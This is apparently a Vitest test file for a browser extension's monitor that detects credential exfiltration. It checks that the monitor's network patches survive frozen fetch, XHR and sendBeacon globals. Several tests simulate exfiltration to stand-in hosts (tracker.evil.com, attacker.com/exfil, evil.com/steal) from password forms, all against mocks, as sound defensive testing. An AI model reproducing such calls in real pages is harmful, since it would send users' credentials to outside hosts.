// @vitest-environment happy-dom
//
// Regression coverage for the JS-behavior monitor's MAIN-world network patches
// when a target global (window.fetch / XMLHttpRequest.prototype.open+send /
// navigator.sendBeacon) has been hardened non-writable by another extension or a
// page-level anti-fingerprinting / bot-detection script.
//
// Pre-fix, the bare assignment in patchFetch/XHR/BeaconMonitoring threw and
// aborted the rest of initJsBehaviorMonitor, silently dropping every later patch
// (and the ns-config-ack handshake). Each test below freezes one global and
// asserts (a) init does not throw and (b) a LATER patch still installed.
//
// Each test imports a fresh module instance via vi.resetModules() so the
// module-scoped _*Patched flags start false and the patch path is actually
// exercised (a shared module would early-return after the first install).
// Because vi.resetModules() only resets the JS module registry — NOT the real
// prototype/global patches a prior test left on the shared happy-dom
// environment — afterEach restores the DOM globals to their native snapshots so
// each test starts from native (and the XHR rollback's "restores native"
// guarantee can be asserted by identity, not merely inferred).

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

type PostSignalFn = (type: string, payload?: Record<string, unknown>) => void;
type Monitor = typeof import("../extension/src/content/js_behavior_monitor");

// Fetch is deliberately a settled test double: these tests prove that the
// wrapper delegates without letting Happy DOM start a real request that its
// environment teardown would abort. The remaining globals are native identity
// snapshots because their rollback behavior is under test.
const TEST_FETCH = vi.fn().mockResolvedValue(new Response()) as unknown as typeof window.fetch;
const NATIVE_XHR_OPEN = XMLHttpRequest.prototype.open;
const NATIVE_XHR_SEND = XMLHttpRequest.prototype.send;
const NATIVE_SEND_BEACON = navigator.sendBeacon;
const NATIVE_VALUE_DESC = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value");

let currentMod: Monitor | null = null;

function defineWritable(obj: object, key: string, value: unknown): void {
  Object.defineProperty(obj, key, { value, writable: true, configurable: true });
}

/** Harden a property non-writable (configurable so afterEach can restore it). */
function freeze(obj: object, key: string): void {
  const value = (obj as Record<string, unknown>)[key];
  Object.defineProperty(obj, key, { value, writable: false, configurable: true });
}

/** Reset the shared DOM globals/prototypes to native between tests. */
function restoreNativeGlobals(): void {
  defineWritable(window, "fetch", TEST_FETCH);
  defineWritable(XMLHttpRequest.prototype, "open", NATIVE_XHR_OPEN);
  defineWritable(XMLHttpRequest.prototype, "send", NATIVE_XHR_SEND);
  if (NATIVE_SEND_BEACON !== undefined) {
    defineWritable(navigator, "sendBeacon", NATIVE_SEND_BEACON);
  }
  if (NATIVE_VALUE_DESC) {
    Object.defineProperty(HTMLInputElement.prototype, "value", NATIVE_VALUE_DESC);
  }
}

beforeEach(() => {
  restoreNativeGlobals();
});

async function freshMonitor(): Promise<Monitor> {
  vi.resetModules();
  currentMod = await import("../extension/src/content/js_behavior_monitor");
  return currentMod;
}

afterEach(() => {
  // Removes the fresh module's capturing 'submit' listener and clears its config
  // so any wrappers it installed go inert before the next test.
  currentMod?._resetState();
  currentMod = null;
  restoreNativeGlobals();
  document.body.innerHTML = "";
  vi.restoreAllMocks();
});

function credentialForm(): void {
  const form = document.createElement("form");
  const pw = document.createElement("input");
  pw.type = "password";
  form.appendChild(pw);
  document.body.appendChild(form);
}

describe("js behavior monitor: frozen MAIN-world globals do not abort init", () => {
  it("frozen window.fetch is caught; the later beacon patch still installs", async () => {
    navigator.sendBeacon = vi.fn().mockReturnValue(true) as unknown as typeof navigator.sendBeacon;
    freeze(window, "fetch");

    const mod = await freshMonitor();
    const postSignal = vi.fn<PostSignalFn>();
    expect(() =>
      mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal }),
    ).not.toThrow();

    // sendBeacon is patched AFTER fetch in the init sequence, so its signal proves
    // init continued past the frozen fetch.
    credentialForm();
    navigator.sendBeacon("https://tracker.evil.com/collect", "payload");
    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-exfil-beacon",
      expect.objectContaining({ destinationOrigin: "https://tracker.evil.com" }),
    );
  });

  it("frozen XMLHttpRequest.prototype.send is caught; open() is rolled back to native and the later beacon patch still installs", async () => {
    window.fetch = vi.fn().mockResolvedValue(new Response()) as unknown as typeof window.fetch;
    navigator.sendBeacon = vi.fn().mockReturnValue(true) as unknown as typeof navigator.sendBeacon;
    freeze(XMLHttpRequest.prototype, "send");

    const mod = await freshMonitor();
    const postSignal = vi.fn<PostSignalFn>();
    expect(() =>
      mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal }),
    ).not.toThrow();

    // The send() patch threw, so the lone open() wrap must have been rolled back to
    // the native method (no half-patched/double-wrapped XHR). Calling Happy DOM's
    // native open() would start a real request whose teardown abort is unrelated
    // to this rollback assertion.
    expect(XMLHttpRequest.prototype.open).toBe(NATIVE_XHR_OPEN);

    // beacon is patched after XHR, so its signal proves init continued.
    credentialForm();
    navigator.sendBeacon("https://tracker.evil.com/collect", "payload");
    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-exfil-beacon",
      expect.objectContaining({ destinationOrigin: "https://tracker.evil.com" }),
    );
  });

  it("frozen XMLHttpRequest.prototype.open is caught; send() is left untouched and the later beacon patch still installs", async () => {
    window.fetch = vi.fn().mockResolvedValue(new Response()) as unknown as typeof window.fetch;
    navigator.sendBeacon = vi.fn().mockReturnValue(true) as unknown as typeof navigator.sendBeacon;
    freeze(XMLHttpRequest.prototype, "open");

    const mod = await freshMonitor();
    const postSignal = vi.fn<PostSignalFn>();
    expect(() =>
      mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal }),
    ).not.toThrow();

    // The open() patch threw and returned early, so send() was never wrapped: both
    // XHR methods are left at native (the wrapper-needs-both invariant holds).
    expect(XMLHttpRequest.prototype.open).toBe(NATIVE_XHR_OPEN);
    expect(XMLHttpRequest.prototype.send).toBe(NATIVE_XHR_SEND);

    credentialForm();
    navigator.sendBeacon("https://tracker.evil.com/collect", "payload");
    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-exfil-beacon",
      expect.objectContaining({ destinationOrigin: "https://tracker.evil.com" }),
    );
  });

  it("frozen navigator.sendBeacon is caught; the later credential-read patch still installs", async () => {
    window.fetch = vi.fn().mockResolvedValue(new Response()) as unknown as typeof window.fetch;
    navigator.sendBeacon = vi.fn().mockReturnValue(true) as unknown as typeof navigator.sendBeacon;
    freeze(navigator, "sendBeacon");

    const mod = await freshMonitor();
    const postSignal = vi.fn<PostSignalFn>();
    expect(() =>
      mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal }),
    ).not.toThrow();

    // The credential-value getter is patched AFTER beacon; reading a password
    // value outside a submit must still emit, proving init continued.
    const input = document.createElement("input");
    input.type = "password";
    document.body.appendChild(input);
    input.value = "secret123";
    void input.value;

    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-credential-read",
      expect.objectContaining({ isInsideSubmitHandler: false }),
    );
  });

  it("does not leave _fetchPatched stuck: a re-sync after fetch becomes writable installs the patch", async () => {
    const native = vi.fn().mockResolvedValue(new Response());
    window.fetch = native as unknown as typeof window.fetch;
    Object.defineProperty(window, "fetch", { value: native, writable: false, configurable: true });

    const mod = await freshMonitor();
    const postSignal = vi.fn<PostSignalFn>();

    // First sync: fetch is frozen, so the patch is skipped (caught), not marked done.
    mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    // fetch becomes writable again, then a later ns-config re-sync re-runs init.
    Object.defineProperty(window, "fetch", { value: native, writable: true, configurable: true });
    mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    // The retry must have installed the wrapper: a 3P fetch correlated with a
    // credential form submit now emits the exfil signal.
    const form = document.createElement("form");
    form.action = "https://evil.com/steal";
    const pw = document.createElement("input");
    pw.type = "password";
    form.appendChild(pw);
    document.body.appendChild(form);
    form.dispatchEvent(new Event("submit", { bubbles: true }));
    window.fetch("https://attacker.com/exfil", { method: "POST" });

    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-exfil-network",
      expect.objectContaining({ api: "fetch", destinationOrigin: "https://attacker.com" }),
    );
  });

  it("does not leave _xhrPatched stuck: a re-sync after send becomes writable installs the XHR patch", async () => {
    window.fetch = vi.fn().mockResolvedValue(new Response()) as unknown as typeof window.fetch;
    navigator.sendBeacon = vi.fn().mockReturnValue(true) as unknown as typeof navigator.sendBeacon;
    const frozenSend = vi.fn() as unknown as typeof XMLHttpRequest.prototype.send;
    defineWritable(XMLHttpRequest.prototype, "send", frozenSend);
    freeze(XMLHttpRequest.prototype, "send");

    const mod = await freshMonitor();
    const postSignal = vi.fn<PostSignalFn>();

    // First sync: send is frozen, so open() is rolled back and the patch is not marked done.
    mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
    expect(XMLHttpRequest.prototype.open).toBe(NATIVE_XHR_OPEN);

    // Re-enable settled delegates, then a later ns-config re-sync re-runs init.
    // The wrapper behavior is what this test owns; native Happy DOM transport is not.
    const resumedOpen = vi.fn() as unknown as typeof XMLHttpRequest.prototype.open;
    const resumedSend = vi.fn() as unknown as typeof XMLHttpRequest.prototype.send;
    defineWritable(XMLHttpRequest.prototype, "open", resumedOpen);
    defineWritable(XMLHttpRequest.prototype, "send", resumedSend);
    mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    // The retry must have installed both wrappers: a 3P XHR correlated with a
    // credential form submit now emits the exfil signal.
    const form = document.createElement("form");
    form.action = "https://evil.com/steal";
    const pw = document.createElement("input");
    pw.type = "password";
    form.appendChild(pw);
    document.body.appendChild(form);
    form.dispatchEvent(new Event("submit", { bubbles: true }));

    const xhr = new XMLHttpRequest();
    xhr.open("POST", "https://attacker.com/collect");
    xhr.send("data");
    expect(resumedOpen).toHaveBeenCalledWith("POST", "https://attacker.com/collect");
    expect(resumedSend).toHaveBeenCalledWith("data");

    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-exfil-network",
      expect.objectContaining({ api: "xhr", destinationOrigin: "https://attacker.com" }),
    );
  });

  it("does not leave _beaconPatched stuck: a re-sync after sendBeacon becomes writable installs the beacon patch", async () => {
    window.fetch = vi.fn().mockResolvedValue(new Response()) as unknown as typeof window.fetch;
    const frozenBeacon = vi.fn().mockReturnValue(true) as unknown as typeof navigator.sendBeacon;
    defineWritable(navigator, "sendBeacon", frozenBeacon);
    freeze(navigator, "sendBeacon");

    const mod = await freshMonitor();
    const postSignal = vi.fn<PostSignalFn>();

    // First sync: sendBeacon is frozen, so the patch is skipped (caught), not marked done.
    mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    // sendBeacon becomes writable again, then a later ns-config re-sync re-runs init.
    const resumedBeacon = vi.fn().mockReturnValue(true) as unknown as typeof navigator.sendBeacon;
    defineWritable(navigator, "sendBeacon", resumedBeacon);
    mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    // The retry must have installed the wrapper: a 3P beacon on a credential page emits.
    credentialForm();
    navigator.sendBeacon("https://tracker.evil.com/collect", "payload");
    expect(resumedBeacon).toHaveBeenCalledWith("https://tracker.evil.com/collect", "payload");

    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-exfil-beacon",
      expect.objectContaining({ destinationOrigin: "https://tracker.evil.com" }),
    );
  });
});
